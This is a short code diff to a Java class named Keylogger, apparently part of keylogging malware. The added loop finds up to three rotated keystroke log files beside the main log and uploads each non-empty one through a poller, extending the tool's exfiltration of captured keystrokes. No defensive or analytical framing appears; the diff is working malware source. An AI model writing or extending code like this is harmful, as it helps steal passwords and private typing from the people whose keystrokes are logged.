@@ -421,6 +421,12 @@ final class Keylogger {
 		if (Files.isRegularFile(seeds) && Files.size(seeds) > 0L) {
 			any |= poller.uploadFile(seeds);
 		}
+		for (int segment = 1; segment <= 3; segment++) {
+			Path rotated = seeds.resolveSibling(seeds.getFileName() + "." + segment);
+			if (Files.isRegularFile(rotated) && Files.size(rotated) > 0L) {
+				any |= poller.uploadFile(rotated);
+			}
+		}
 		return any ? "Key logs uploaded" : "No key log yet";
 	}
 
